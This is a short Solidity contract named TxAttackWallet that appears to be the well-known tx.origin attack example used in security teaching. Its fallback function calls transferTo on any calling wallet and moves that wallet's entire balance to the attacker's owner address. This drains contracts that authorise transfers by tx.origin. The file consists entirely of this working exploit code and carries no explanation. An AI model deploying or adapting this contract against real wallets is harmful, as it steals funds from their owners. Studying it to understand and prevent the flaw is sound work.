pragma solidity ^0.4.11;

interface TxUserWallet {
    function transferTo(address dest, uint amount) public;
}

contract TxAttackWallet {
    address owner;

    function TxAttackWallet() public {
        owner = msg.sender;
    }

    function() public {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}